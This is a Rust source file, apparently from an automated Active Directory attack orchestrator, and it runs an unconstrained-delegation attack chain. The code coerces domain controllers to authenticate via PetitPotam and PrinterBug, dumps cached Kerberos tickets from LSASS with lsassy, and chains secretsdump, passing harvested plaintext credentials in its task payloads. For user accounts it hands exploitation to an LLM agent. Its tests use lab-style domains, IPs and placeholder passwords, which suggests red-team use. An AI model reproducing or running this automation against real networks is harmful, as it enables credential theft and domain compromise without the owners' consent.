//! auto_unconstrained_exploitation -- coerce-and-dump for unconstrained delegation.
//!
//! When a machine account with unconstrained delegation is discovered (e.g.
//! `DC02$`), this automation orchestrates the full attack chain:
//!
//!   1. **Coerce** a DC to authenticate to the unconstrained delegation host
//!      (PetitPotam / PrinterBug). The DC's TGT is cached in LSASS on that host.
//!   2. **Dump** cached TGTs from the host's LSASS memory via lsassy.
//!   3. **Chain** — result_processing's `auto_chain_s4u_secretsdump` picks up any
//!      `.ccache` ticket and dispatches secretsdump automatically.
//!
//! User accounts with unconstrained delegation (e.g. `sarah.connor`) are left to
//! the LLM-driven exploit path since we can't determine the target host.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tokio::time::Instant;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::DEDUP_COERCED_DCS;

/// Delay after coercion before dispatching the first TGT dump, giving the
/// coerced authentication time to complete and the TGT to land in LSASS.
const COERCE_TO_DUMP_DELAY: Duration = Duration::from_secs(15);

/// Maximum TGT dump attempts per vulnerability before giving up.
const MAX_DUMP_ATTEMPTS: u32 = 3;

/// Delay between successive dump retries for the same vuln.
const DUMP_RETRY_DELAY: Duration = Duration::from_secs(60);

/// True when an unconstrained-delegation machine host coincides with the
/// DC we'd coerce *from* — the coerce-and-capture chain requires the DC
/// to authenticate to a *different* unconstrained host whose LSASS we
/// then dump for the captured TGT. When they're the same machine both
/// PetitPotam (self-loop returns rpc_s_access_denied) and PrinterBug
/// (ERROR_INVALID_HANDLE) fail, and even a successful self-coerce would
/// require local admin on the DC — at which point dc_secretsdump is the
/// canonical exploitation path. Emits a debug log explaining why the
/// chain was skipped so the operator can distinguish "subsumed by
/// dc_secretsdump" (we already own the domain) from "deferring (no
/// self-coerce path)" (we don't).
///
/// User accounts (no trailing `$`) never trigger this skip — for them we
/// route to the LLM exploit path regardless.
fn skip_self_coerce_loop(
    vuln_id: &str,
    is_machine: bool,
    dc_ip: Option<&str>,
    host_ip: &str,
    domain_lc: &str,
    dominated_domains: &HashSet<String>,
) -> bool {
    if !is_machine {
        return false;
    }
    if dc_ip.is_none_or(|ip| ip != host_ip) {
        return false;
    }
    if dominated_domains.contains(domain_lc) {
        debug!(
            vuln_id = %vuln_id,
            host = %host_ip,
            "Unconstrained delegation host == DC — subsumed by dc_secretsdump"
        );
    } else {
        debug!(
            vuln_id = %vuln_id,
            host = %host_ip,
            "Unconstrained delegation host == DC — deferring (no self-coerce path)"
        );
    }
    true
}

// Phase tracking (in-memory only — intentionally not persisted so restarts
// re-trigger the chain, since cached TGTs expire quickly).
#[derive(Debug)]
struct PhaseState {
    coercion_dispatched_at: Option<Instant>,
    dump_attempts: u32,
    last_dump_at: Option<Instant>,
    completed: bool,
}

/// Monitors for unconstrained delegation vulns and orchestrates coerce → dump.
/// Interval: 20s. Wakes on delegation_notify and credential_access_notify.
pub async fn auto_unconstrained_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let deleg_notify = dispatcher.delegation_notify.clone();
    let cred_notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    let mut phases: HashMap<String, PhaseState> = HashMap::new();

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = deleg_notify.notified() => {},
            _ = cred_notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<UnconstrainedWork> = {
            let state = dispatcher.state.read().await;

            // Skip only when ALL forests are dominated AND strategy says to stop.
            // When continue_after_da is true, keep exploiting unconstrained
            // delegation for path diversity even after full domination.
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    if vuln.vuln_type.to_lowercase() != "unconstrained_delegation" {
                        return None;
                    }
                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let account_name = vuln
                        .details
                        .get("account_name")
                        .and_then(|v| v.as_str())?
                        .to_string();

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Skip completed vulns
                    if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                        return None;
                    }

                    // Machine accounts: resolve hostname → IP for coerce+dump chain.
                    // User accounts: dispatch LLM exploit task since we can't determine
                    // which host to coerce from just the account name.
                    let is_machine = account_name.ends_with('$');

                    // Find a DC in the same domain — this is what we coerce FROM.
                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    let host_ip = if is_machine {
                        let hostname_prefix = account_name.trim_end_matches('$').to_lowercase();
                        state.hosts.iter().find_map(|h| {
                            let h_lower = h.hostname.to_lowercase();
                            if h_lower == hostname_prefix
                                || h_lower.starts_with(&format!("{hostname_prefix}."))
                            {
                                Some(h.ip.clone())
                            } else {
                                None
                            }
                        })?
                    } else {
                        // For user accounts, use the DC IP as the target — the LLM
                        // exploit agent will determine the right approach (e.g. find
                        // where the user is logged in, or use S4U).
                        dc_ip.as_ref().cloned()?
                    };

                    if skip_self_coerce_loop(
                        &vuln.vuln_id,
                        is_machine,
                        dc_ip.as_deref(),
                        &host_ip,
                        &domain.to_lowercase(),
                        &state.dominated_domains,
                    ) {
                        return None;
                    }

                    // Find any non-quarantined credential with a password for this domain.
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            !c.password.is_empty()
                                && c.domain.to_lowercase() == domain.to_lowercase()
                                && !state.is_principal_quarantined(&c.username, &c.domain)
                        })
                        .cloned();

                    if credential.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            "Unconstrained: no credential available yet"
                        );
                        return None;
                    }

                    // User accounts go straight to LLM exploit (one-shot, no coerce+dump).
                    if !is_machine {
                        let dedup_key = format!("uc_user:{}", account_name.to_lowercase());
                        if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                            return None;
                        }
                        return Some(UnconstrainedWork {
                            vuln_id: vuln.vuln_id.clone(),
                            account_name,
                            domain,
                            host_ip,
                            dc_ip,
                            credential,
                            action: Action::LlmExploit,
                            _dedup_key: Some(dedup_key),
                        });
                    }

                    // Determine action based on current phase (machine accounts only).
                    let phase = phases.get(&vuln.vuln_id);

                    // If auto_coercion already coerced this DC, skip straight to dump.
                    let already_coerced = dc_ip
                        .as_ref()
                        .is_some_and(|ip| state.is_processed(DEDUP_COERCED_DCS, ip));

                    let action = match phase {
                        // No phase yet — dispatch coercion (or skip if already coerced).
                        None if already_coerced => Action::Dump,
                        None if dc_ip.is_some() => Action::Coerce,
                        None => {
                            debug!(
                                vuln_id = %vuln.vuln_id,
                                "Unconstrained: no DC found for coercion"
                            );
                            return None;
                        }

                        // Coercion dispatched, waiting for delay before dump.
                        Some(p)
                            if p.coercion_dispatched_at.is_some()
                                && p.dump_attempts == 0
                                && p.coercion_dispatched_at.unwrap().elapsed()
                                    >= COERCE_TO_DUMP_DELAY =>
                        {
                            Action::Dump
                        }

                        // Dump retry — previous attempt didn't yield TGTs.
                        Some(p)
                            if p.dump_attempts > 0
                                && p.dump_attempts < MAX_DUMP_ATTEMPTS
                                && p.last_dump_at
                                    .is_none_or(|t| t.elapsed() >= DUMP_RETRY_DELAY) =>
                        {
                            Action::Dump
                        }

                        _ => return None,
                    };

                    Some(UnconstrainedWork {
                        vuln_id: vuln.vuln_id.clone(),
                        account_name,
                        domain,
                        host_ip,
                        dc_ip,
                        credential,
                        action,
                        _dedup_key: None,
                    })
                })
                .collect()
        };

        for item in work {
            match item.action {
                Action::Coerce => {
                    let dc_ip = match &item.dc_ip {
                        Some(ip) => ip.clone(),
                        None => continue,
                    };

                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    // Coerce DC → unconstrained host. The DC's TGT is cached
                    // in the unconstrained host's LSASS.
                    let payload = json!({
                        "target_ip": dc_ip,
                        "listener_ip": item.host_ip,
                        "techniques": ["petitpotam", "printerbug"],
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                        "reason": "unconstrained_delegation_coercion",
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("coercion", "coercion", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                dc = %dc_ip,
                                listener = %item.host_ip,
                                "Unconstrained delegation: coercion dispatched (DC → host)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: Some(Instant::now()),
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: false,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "Coercion deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained coercion"
                            );
                        }
                    }
                }

                Action::Dump => {
                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    let payload = json!({
                        "technique": "unconstrained_tgt_dump",
                        "vuln_type": "unconstrained_delegation",
                        "vuln_id": item.vuln_id,
                        "target": item.host_ip,
                        "target_ip": item.host_ip,
                        "domain": item.domain,
                        "account_name": item.account_name,
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            let phase = phases.entry(item.vuln_id.clone()).or_insert(PhaseState {
                                coercion_dispatched_at: None,
                                dump_attempts: 0,
                                last_dump_at: None,
                                completed: false,
                            });
                            phase.dump_attempts += 1;
                            phase.last_dump_at = Some(Instant::now());

                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                attempt = phase.dump_attempts,
                                target = %item.host_ip,
                                "Unconstrained delegation: TGT dump dispatched"
                            );

                            if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
                                phase.completed = true;
                                debug!(
                                    vuln_id = %item.vuln_id,
                                    "Unconstrained delegation: max dump attempts reached"
                                );
                            }
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "TGT dump deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch TGT dump"
                            );
                        }
                    }
                }

                Action::LlmExploit => {
                    // User-account unconstrained delegation — dispatch to LLM
                    // exploit agent which can determine the right approach
                    // (find where user is logged in, monitor for TGTs, etc.)
                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    let payload = json!({
                        "technique": "unconstrained_delegation_exploit",
                        "vuln_type": "unconstrained_delegation",
                        "vuln_id": item.vuln_id,
                        "target": item.host_ip,
                        "target_ip": item.host_ip,
                        "domain": item.domain,
                        "account_name": item.account_name,
                        "is_user_account": true,
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                "Unconstrained delegation: LLM exploit dispatched (user account)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: None,
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: true,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "LLM exploit deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained LLM exploit"
                            );
                        }
                    }
                }
            }
        }
    }
}

#[derive(Debug)]
enum Action {
    Coerce,
    Dump,
    /// Dispatch to LLM exploit agent (for user accounts).
    LlmExploit,
}

struct UnconstrainedWork {
    vuln_id: String,
    account_name: String,
    domain: String,
    host_ip: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    action: Action,
    _dedup_key: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;
    use tokio::time::Instant;

    // hostname resolution logic

    /// Simulate the hostname resolution logic from the main function.
    fn resolve_host_ip(account_name: &str, hosts: &[(String, String)]) -> Option<String> {
        let hostname_prefix = account_name.trim_end_matches('$').to_lowercase();
        hosts.iter().find_map(|(hostname, ip)| {
            let h_lower = hostname.to_lowercase();
            if h_lower == hostname_prefix || h_lower.starts_with(&format!("{hostname_prefix}.")) {
                Some(ip.clone())
            } else {
                None
            }
        })
    }

    #[test]
    fn hostname_resolution_machine_account() {
        let account = "DC02$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc02");

        let hostname = "dc02.child.contoso.local";
        let h_lower = hostname.to_lowercase();
        assert!(h_lower == prefix || h_lower.starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn hostname_resolution_short_name() {
        let account = "DC01$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc01");

        assert!("dc01" == prefix);
        assert!("dc01.contoso.local".starts_with(&format!("{prefix}.")));
        assert!(!"dc011.contoso.local".starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn hostname_resolution_fqdn_match() {
        let hosts = vec![
            (
                "dc01.contoso.local".to_string(),
                "192.168.58.10".to_string(),
            ),
            (
                "sql01.contoso.local".to_string(),
                "192.168.58.20".to_string(),
            ),
        ];
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_short_hostname_match() {
        let hosts = vec![("dc01".to_string(), "192.168.58.10".to_string())];
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_no_match() {
        let hosts = vec![
            (
                "sql01.contoso.local".to_string(),
                "192.168.58.20".to_string(),
            ),
            (
                "web01.contoso.local".to_string(),
                "192.168.58.30".to_string(),
            ),
        ];
        assert_eq!(resolve_host_ip("DC01$", &hosts), None);
    }

    #[test]
    fn hostname_resolution_case_insensitive() {
        let hosts = vec![(
            "DC01.CONTOSO.LOCAL".to_string(),
            "192.168.58.10".to_string(),
        )];
        assert_eq!(
            resolve_host_ip("dc01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_prefix_not_substring() {
        // "dc01" should not match "dc011.contoso.local"
        let hosts = vec![(
            "dc011.contoso.local".to_string(),
            "192.168.58.11".to_string(),
        )];
        assert_eq!(resolve_host_ip("DC01$", &hosts), None);
    }

    #[test]
    fn hostname_resolution_multiple_domains() {
        let hosts = vec![
            (
                "dc01.contoso.local".to_string(),
                "192.168.58.10".to_string(),
            ),
            (
                "dc01.fabrikam.local".to_string(),
                "192.168.58.40".to_string(),
            ),
        ];
        // Returns first match
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    // is_machine_account

    #[test]
    fn is_machine_account() {
        assert!("DC02$".ends_with('$'));
        assert!("SQL01$".ends_with('$'));
        assert!("WEB01$".ends_with('$'));
        assert!(!"testuser".ends_with('$'));
        assert!(!"Administrator".ends_with('$'));
        assert!(!"svc_admin".ends_with('$'));
    }

    #[test]
    fn machine_account_prefix_extraction() {
        assert_eq!("DC01$".trim_end_matches('$').to_lowercase(), "dc01");
        assert_eq!("SQL01$".trim_end_matches('$').to_lowercase(), "sql01");
        assert_eq!("WEB-SRV$".trim_end_matches('$').to_lowercase(), "web-srv");
    }

    // user account handling

    #[test]
    fn user_account_gets_dc_ip_as_target() {
        let account = "testuser";
        let is_machine = account.ends_with('$');
        assert!(!is_machine);
    }

    // dedup key format

    #[test]
    fn dedup_key_format_user_account() {
        let account = "testuser";
        let dedup_key = format!("uc_user:{}", account.to_lowercase());
        assert_eq!(dedup_key, "uc_user:testuser");
    }

    #[test]
    fn dedup_key_case_normalized() {
        let key1 = format!("uc_user:{}", "TestUser".to_lowercase());
        let key2 = format!("uc_user:{}", "testuser".to_lowercase());
        assert_eq!(key1, key2);
    }

    #[test]
    fn dedup_key_unique_per_user() {
        let key1 = format!("uc_user:{}", "user1".to_lowercase());
        let key2 = format!("uc_user:{}", "user2".to_lowercase());
        assert_ne!(key1, key2);
    }

    // PhaseState

    #[test]
    fn phase_state_defaults() {
        let phase = PhaseState {
            coercion_dispatched_at: None,
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        assert!(!phase.completed);
        assert_eq!(phase.dump_attempts, 0);
        assert!(phase.coercion_dispatched_at.is_none());
        assert!(phase.last_dump_at.is_none());
    }

    #[test]
    fn phase_state_after_coercion() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        assert!(phase.coercion_dispatched_at.is_some());
        assert_eq!(phase.dump_attempts, 0);
        assert!(!phase.completed);
    }

    #[test]
    fn phase_state_after_first_dump() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        assert_eq!(phase.dump_attempts, 1);
        assert!(phase.last_dump_at.is_some());
        assert!(!phase.completed);
    }

    #[test]
    fn phase_state_max_attempts_reached() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: MAX_DUMP_ATTEMPTS,
            last_dump_at: Some(Instant::now()),
            completed: true,
        };
        assert!(phase.completed);
        assert_eq!(phase.dump_attempts, MAX_DUMP_ATTEMPTS);
    }

    #[test]
    fn phase_state_under_max_attempts() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: MAX_DUMP_ATTEMPTS - 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        assert!(phase.dump_attempts < MAX_DUMP_ATTEMPTS);
        assert!(!phase.completed);
    }

    // Coercion timing logic

    #[test]
    fn coerce_to_dump_delay_not_elapsed() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        // Just created, delay has not elapsed
        let elapsed = phase.coercion_dispatched_at.unwrap().elapsed();
        assert!(elapsed < COERCE_TO_DUMP_DELAY);
    }

    // Dump retry timing logic

    #[test]
    fn dump_retry_eligible_no_last_dump() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: None,
            completed: false,
        };
        // With last_dump_at = None, retry should be eligible
        assert!(phase
            .last_dump_at
            .is_none_or(|t| t.elapsed() >= DUMP_RETRY_DELAY));
    }

    #[test]
    fn dump_retry_not_yet_eligible() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        // Just dumped, retry delay has not elapsed
        let elapsed = phase.last_dump_at.unwrap().elapsed();
        assert!(elapsed < DUMP_RETRY_DELAY);
    }

    // Constants

    #[test]
    fn max_dump_attempts_constant() {
        assert_eq!(MAX_DUMP_ATTEMPTS, 3);
    }

    #[test]
    fn coerce_to_dump_delay() {
        assert_eq!(COERCE_TO_DUMP_DELAY, Duration::from_secs(15));
    }

    #[test]
    fn dump_retry_delay() {
        assert_eq!(DUMP_RETRY_DELAY, Duration::from_secs(60));
    }

    // Action enum

    #[test]
    fn action_debug_format() {
        assert_eq!(format!("{:?}", Action::Coerce), "Coerce");
        assert_eq!(format!("{:?}", Action::Dump), "Dump");
        assert_eq!(format!("{:?}", Action::LlmExploit), "LlmExploit");
    }

    // UnconstrainedWork construction patterns

    #[test]
    fn unconstrained_work_machine_coerce() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-001".to_string(),
            account_name: "DC02$".to_string(),
            domain: "contoso.local".to_string(),
            host_ip: "192.168.58.11".to_string(),
            dc_ip: Some("192.168.58.10".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-1".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::Coerce,
            _dedup_key: None,
        };

        assert!(work.account_name.ends_with('$'));
        assert!(work.dc_ip.is_some());
        assert!(work.credential.is_some());
        assert!(work._dedup_key.is_none());
        assert!(matches!(work.action, Action::Coerce));
    }

    #[test]
    fn unconstrained_work_machine_dump() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-002".to_string(),
            account_name: "SQL01$".to_string(),
            domain: "fabrikam.local".to_string(),
            host_ip: "192.168.58.21".to_string(),
            dc_ip: Some("192.168.58.20".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-2".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "fabrikam.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::Dump,
            _dedup_key: None,
        };

        assert!(matches!(work.action, Action::Dump));
        assert_eq!(work.host_ip, "192.168.58.21");
    }

    #[test]
    fn unconstrained_work_user_llm_exploit() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-003".to_string(),
            account_name: "svc_admin".to_string(),
            domain: "contoso.local".to_string(),
            host_ip: "192.168.58.10".to_string(), // DC IP used as target for user accounts
            dc_ip: Some("192.168.58.10".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-3".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::LlmExploit,
            _dedup_key: Some("uc_user:svc_admin".to_string()),
        };

        assert!(!work.account_name.ends_with('$'));
        assert!(matches!(work.action, Action::LlmExploit));
        assert_eq!(
            work._dedup_key.as_ref().expect("dedup key should be set"),
            "uc_user:svc_admin"
        );
        // For user accounts, host_ip matches dc_ip
        assert_eq!(work.host_ip, work.dc_ip.as_ref().unwrap().as_str());
    }

    // Phase state machine transitions

    #[test]
    fn phase_transition_none_to_coerce() {
        // When no phase exists and DC is available, action should be Coerce
        let mut phases: HashMap<String, PhaseState> = HashMap::new();
        let vuln_id = "vuln-001";
        let dc_ip = Some("192.168.58.10".to_string());
        let already_coerced = false;

        let phase = phases.get(vuln_id);
        let action = match phase {
            None if already_coerced => Action::Dump,
            None if dc_ip.is_some() => Action::Coerce,
            _ => Action::Dump, // fallback for test
        };

        assert!(matches!(action, Action::Coerce));

        // After coercion, insert phase state
        phases.insert(
            vuln_id.to_string(),
            PhaseState {
                coercion_dispatched_at: Some(Instant::now()),
                dump_attempts: 0,
                last_dump_at: None,
                completed: false,
            },
        );
        assert!(phases.contains_key(vuln_id));
    }

    #[test]
    fn phase_transition_already_coerced_skips_to_dump() {
        let phases: HashMap<String, PhaseState> = HashMap::new();
        let vuln_id = "vuln-002";
        let dc_ip = Some("192.168.58.10".to_string());
        let already_coerced = true;

        let phase = phases.get(vuln_id);
        let action = match phase {
            None if already_coerced => Action::Dump,
            None if dc_ip.is_some() => Action::Coerce,
            _ => Action::Coerce, // fallback for test
        };

        assert!(matches!(action, Action::Dump));
    }

    #[test]
    fn phase_dump_increments_attempts() {
        let mut phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };

        // Simulate dump dispatch
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        assert_eq!(phase.dump_attempts, 1);

        // Second dump
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        assert_eq!(phase.dump_attempts, 2);

        // Third dump (max)
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
            phase.completed = true;
        }
        assert_eq!(phase.dump_attempts, 3);
        assert!(phase.completed);
    }

    #[test]
    fn phase_llm_exploit_immediately_completed() {
        let phase = PhaseState {
            coercion_dispatched_at: None,
            dump_attempts: 0,
            last_dump_at: None,
            completed: true,
        };
        // LLM exploit phases are marked completed immediately
        assert!(phase.completed);
        assert!(phase.coercion_dispatched_at.is_none());
        assert_eq!(phase.dump_attempts, 0);
    }

    // skip_self_coerce_loop

    #[test]
    fn skip_self_coerce_loop_user_account_never_skips() {
        let dominated = HashSet::new();
        // is_machine = false → always returns false regardless of IP overlap.
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            false,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_no_dc_ip_no_skip() {
        let dominated = HashSet::new();
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            true,
            None,
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_distinct_dc_no_skip() {
        let dominated = HashSet::new();
        // DC and unconstrained host are different machines — the chain is
        // viable, so we don't skip.
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.20",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dc_equals_host_skips_when_dominated() {
        let mut dominated = HashSet::new();
        dominated.insert("contoso.local".to_string());
        // host == DC AND domain already dominated → skip (subsumed by
        // dc_secretsdump).
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dc_equals_host_skips_when_not_dominated() {
        let dominated = HashSet::new();
        // host == DC and domain NOT dominated → still skip, but the debug
        // log explains it's a defer (no self-coerce path) rather than a
        // subsumption.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dominance_check_is_case_sensitive_on_input() {
        // Caller is responsible for lowercasing the domain before passing it
        // in — the helper compares with the dominated_domains set as-is.
        let mut dominated = HashSet::new();
        dominated.insert("contoso.local".to_string());
        // Lowercase input matches → skip path.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
        // Uppercase input does NOT match — but skip still fires because
        // host == DC; only the log branch differs.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "CONTOSO.LOCAL",
            &dominated,
        ));
    }
}
